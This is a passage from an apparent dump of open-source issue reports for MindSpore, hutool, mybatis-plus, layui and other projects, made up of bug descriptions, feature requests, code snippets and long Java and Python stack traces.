384]&gt;,bert.tinybert_encoder.layers.0.attention.output.dense.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.output.layernorm.gamma:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.output.layernorm.beta:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.intermediate.weight:&lt;Ref[Tensor(F32)][1536, 384]&gt;,bert.tinybert_encoder.layers.0.intermediate.bias:&lt;Ref[Tensor(F32)][1536]&gt;,bert.tinybert_encoder.layers.0.output.dense.weight:&lt;Ref[Tensor(F32)][384, 1536]&gt;,bert.tinybert_encoder.layers.0.output.dense.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.output.layernorm.gamma:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.output.layernorm.beta:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.query_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.query_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.key_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.key_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.value_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.1.attention.attention.value_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinyb [ERROR] DEBUG(107773,ffffa53a3480,python):2021-07-07-17:36:18.054.782 [mindspore/ccsrc/debug/trace.cc:129] TraceGraphEval] ************************************************************************************* dataset size: 10 dataset repeatcount: 1 Traceback (most recent call last): File ""/ms_test1/zjc/workspace/solution_test/test_scripts/mindspore/net/tinybert/network/test_ms_model_zoo_tinybert_gd_perf/scripts/../run_general_distill.py"", line 206, in &lt;module&gt; run_general_distill() File ""/ms_test1/zjc/workspace/solution_test/test_scripts/mindspore/net/tinybert/network/test_ms_model_zoo_tinybert_gd_perf/src/model_utils/moxing_adapter.py"", line 109, in wrapped_func run_func(*args, **kwargs) File ""/ms_test1/zjc/workspace/solution_test/test_scripts/mindspore/net/tinybert/network/test_ms_model_zoo_tinybert_gd_perf/scripts/../run_general_distill.py"", line 201, in run_general_distill sink_size=args_opt.data_sink_steps) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 635, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 435, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 495, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 385, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 643, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 630, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 531, in compile result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name) RuntimeError: mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:228 Eval] Illegal AnfNode for evaluating, node: 1_construct_wrapper.1290:bert.tinybert_embedding_lookup.embedding_table(Parameter), fg: 1_construct_wrapper.1290 The function call stack (See file 'analyze_fail_0.dat' for more details): # 0 In file /ms_test1/zjc/workspace/solution_test/test_scripts/mindspore/net/tinybert/network/test_ms_model_zoo_tinybert_gd_perf/src/tinybert_for_gd_td.py(263) init = F.depend(init, loss)"
"[CT][MS][Probability]Uniform, there is no verification when low is bool",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 def test_uniform_low_is_bool(): low = False with pytest.raises(TypeError): net = NetBasics(low=low) pytest -s test_1::test_uniform_low_is_bool pass   <code>: ______________________________________________________________________________ test_uniform_low_is_bool ______________________________________________________________________________ @Author(""zwx5320437"") @Level2 def test_uniform_low_is_bool(): low = False with pytest.raises(TypeError): &gt; net = NetBasics(low=low) E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; test_1.py:162: Failed"
MD C++ api decouple ABI compile macro,"Task Use this template for task tracking kind/task Task Description Currently we fix ABI macro = 0 for mindspore compile, but we need to support ABI macro = 1. So we add a interface to communicate string sign compiled by ABI=0 and ABI=1 Task Goal Sub Task No. Task Description Issue ID 1 2   <code>: vector&lt;char&gt;"
从2.9开始启动报StackOverflowError,这里输入代码   <code>: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'okHttpClientBuilder' defined in class path resource [org/springframework/cloud/commons/httpclient/HttpClientConfiguration$OkHttpClientConfiguration.class]: Initialization of bean failed; nested exception is java.lang.StackOverflowError at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:603) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) Caused by: java.lang.StackOverflowError: null at java.lang.reflect.Method.getParameterTypes(Method.java:264) at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:59) at com.sun.proxy.$Proxy116.annotationType(Unknown Source) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:105) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108) at cn.hutool.core.annotation.CombinationAnnotationElement.parseDeclared(CombinationAnnotationElement.java:108)
二级缓存与多住户缓存错误问题,"当前使用版本 3.1.2 我开启了Mybatis的二级缓存，并且我配置了多租户解析器。 我使用自定义的方法： ，我用两个不同的租户进行查询，第一个租户查询的结果是正确的，第二个租户查询时的tenantId与第一个租户不一样，但是没执行sql直接取二级缓存的数据了,日志提示命中了缓存，所以说第二个租户查询到的信息是错的。 我还使用了自定义的带分页的查询方法： 两次是不同租户进行查询，tenantId不同，但是第二次查询还是命中了缓存。查询的list与第一次一样，并且第二次取得的total值为0。 请问面对这样的问题，在开启二级缓存的情况下，能否解决？   <code>: List&lt;User&gt; mySelectList(@Param(Constants.WRAPPER) Wrapper&lt;User&gt; wrapper); &lt;select id=""mySelectList"" resultType=""User""&gt; select * from user ${ew.customSqlSegment} &lt;/select&gt; Cache Hit Ratio [com.mp.dao.UserMapper]: 0.5 IPage&lt;User&gt; selectUserPage(Page&lt;User&gt; page,@Param(Constants.WRAPPER) Wrapper&lt;User&gt; wrapper); &lt;select id=""selectUserPage"" resultType=""User""&gt; select * from user ${ew.customSqlSegment} &lt;/select&gt;"
关于扫描：EsMapperScan的建议,"EsMapperScan扫描是不是不够灵活？ 按照官方文档，项目结构必须是如下所示：   <code>: @EsMapperScan(basePackages = XXConst.BASE_PACKAGE, markerInterface = BaseEsMapper.class)"
数字输入框修改时有默认值0,"当前表单存在多个数字输入框（非必填，无默认值），新增时都是OK的。但是修改时输入框出现默认值0（有值的时正常的，无值才这样），后端接口返回的值是null，添加默认值仍无效，请问如何解决？   <code>: ""value"": undefined { ""prop"": ""topLimit"", ""span"": 12, ""step"": 1, ""type"": ""number"", ""label"": ""上上限"", ""display"": true, ""controls"": true, ""value"": undefined }"
表单中radio的验证没有作用,"这是我写的代码 在使用lay-verify对文本框进行验证的时候是有效的，但是对radio无效   <code>: &lt;div class=""layui-form-item""&gt; &lt;label class=""layui-form-label""&gt;单选框&lt;/label&gt; &lt;div class=""layui-input-block""&gt; &lt;input type=""radio"" name=""sex"" value=""男"" lay-verify='required' title=""男"" /&gt; &lt;input type=""radio"" name=""sex"" value=""女"" lay-verify='required' title=""女"" /&gt; &lt;/div&gt; &lt;/div&gt;"
ObjectUtil增加模糊对比是否相等,"JDK版本： openjdk_8_201 hutool版本： 5.7.22 建议在ObjectUtil工具类中增加对象的模糊相等比较，对应String与Boolean和Date类型   <code>: public static boolean fuzzyEquals(Object source, Object target) { if (source instanceof Boolean &amp;&amp; target instanceof String) { return (boolean) source == BooleanUtil.toBoolean((String) target); } else if (target instanceof Boolean &amp;&amp; source instanceof String) { return (boolean) target == BooleanUtil.toBoolean((String) source); } else if (source instanceof Date &amp;&amp; target instanceof String) { return DateUtil.parse((String) target).equals(source); } else if (target instanceof Date &amp;&amp; source instanceof String) { return DateUtil.parse((String) source).equals(target); } else { return equals(source, target); } }"
u-collapse-item 组件中展示为图片时默认高度不撑开,u-collapse组件-动态显示时；内容区为富文本，高度没有撑开 修改 u-collapse-item封装组件中的// 查询内容高度queryRect()方法 加上this.$nextTick 就可以计算出正确高度   <code>: this.$nextTick(function(){ this.$uGetRect('#' + this.elId).then(res =&gt; { this.height = res.height; }) })
Make increment_op support GPU variable input,"In our current code, all control flow variables are on CPU. It works well during normal training. However, if we try to load a model or restore a checkpoint on a GPU machine, the has no information about where variables should be and has to load all of them to GPU. It makes training crash because the can only take CPU variables now.   <code>: load_op increment_op"
点击商品明细页面报错,Microsoft.Data.SqlClient.SqlException (0x80131904): 列名 'goodsSkuIds' 无效。 列名 'goodsParamsIds' 无效。 遇到问题的原因： 点击商品明细页面（pages/goods/goodDetails/goodDetails?id=4157）报错，跟踪发现表缺少字段'goodsSkuIds' ，'goodsParamsIds' 开发环境： VS 2019 复显步骤： 直接点击商品明细 期望达到的效果： 不报错 多张全屏大图： 如需上传图片，可直接截图后此处粘贴即可，不需要点击上传按钮上传。   <code>: CoreCmsGoods
表格搜索栏中使用clumn属性中type是switch或者radio时，页面全部显示下拉，新增修改中正常显示对应类型,"版本 v2.8.19 搜索栏中显示的是select下拉框而不是radio类型组件? 目前已知的有radio、switch，有这个问题   <code>: { label: 'xxx', prop: 'xxx', hide: true, search: true, type: 'radio', dicData: [{ label: '正常', value: 0 }, { label: '停用', value: 1 }] }"
 [新功能] 集成 Castle.Core 拦截器功能,将拦截器和Autofac结合，见 #I1LT51: [新功能] 编写依赖注入/控制反转核心代码   <code>: Castle.Core
PaginationInnerInterceptor 特地情况下出现IndexOutOfBoundsException 数组异常,"当前使用版本 compile group: 'com.baomidou', name: 'mybatis-plus', version: '3.4.1' 数据库使用的是taosdata,涛思数据, 执行了一个带分页的查询语句,没有满足条件的查询结果   <code>: ==&gt; Preparing: SELECT COUNT(*) FROM Event WHERE tenant_Id = ? AND event_Type = ? AND device_Assignment_Token = ? ==&gt; Parameters: 304IOT(String), CommandInvocation(String), 2dc173e2-8c89-49ef-bf85-8791fe3bb4e2(String) &lt;== Total: 0 2021-01-25T11:05:58,974 [http-nio-8089-exec-10] ERROR [RestController] Unhandled runtime exception. org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in mapper\TaosDataEvent.Mapper.xml ### The error may involve com.ccpiot.taosdata.dao.TaosDataEventDao.listDeviceCommandInvocations_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM Event WHERE tenant_Id = ? AND event_Type = ? AND device_Assignment_Token = ? ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) ~[mybatis-spring-2.0.5.jar:2.0.5] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) ~[mybatis-spring-2.0.5.jar:2.0.5] at com.sun.proxy.$Proxy53.selectList(Unknown Source) ~[?:?] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) ~[mybatis-spring-2.0.5.jar:2.0.5] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:147) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:80) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperProxy$PlainMethodInvoker.invoke(MapperProxy.java:152) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:85) ~[mybatis-3.5.6.jar:3.5.6] at com.sun.proxy.$Proxy83.listDeviceCommandInvocations(Unknown Source) ~[?:?] at com.ccpiot.taosdata.service.MyBatisTaosDataDeviceEventManagement.listDeviceCommandInvocations(MyBatisTaosDataDeviceEventManagement.java:550) ~[classes/:?] at com.ccpiot.device.DeviceEventManagementDecorator.listDeviceCommandInvocations(DeviceEventManagementDecorator.java:355) ~[classes/:?] at com.ccpiot.web.rest.controllers.AssignmentsController.listCommandInvocations(AssignmentsController.java:907) ~[classes/:?] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_221] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_221] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_221] at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_221] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) ~[spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133) ~[spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:687) [javax.servlet-api-3.1.0.jar:3.1.0] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) [javax.servlet-api-3.1.0.jar:3.1.0] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:96) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.JsonpFilter.doFilter(JsonpFilter.java:86) [classes/:?] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.NoCacheFilter.doFilterInternal(NoCacheFilter.java:38) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.ResponseTimerFilter.doFilterInternal(ResponseTimerFilter.java:42) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.MethodOverrideFilter.doFilterInternal(MethodOverrideFilter.java:42) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:74) [spring-session-1.3.0.RELEASE.jar:?] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:262) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:215) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:64) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:214) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:177) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:262) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:108) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:81) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.session.web.http.SessionRepositoryFilter.doFilterInternal(SessionRepositoryFilter.java:167) [spring-session-1.3.0.RELEASE.jar:?] at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:80) [spring-session-1.3.0.RELEASE.jar:?] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] 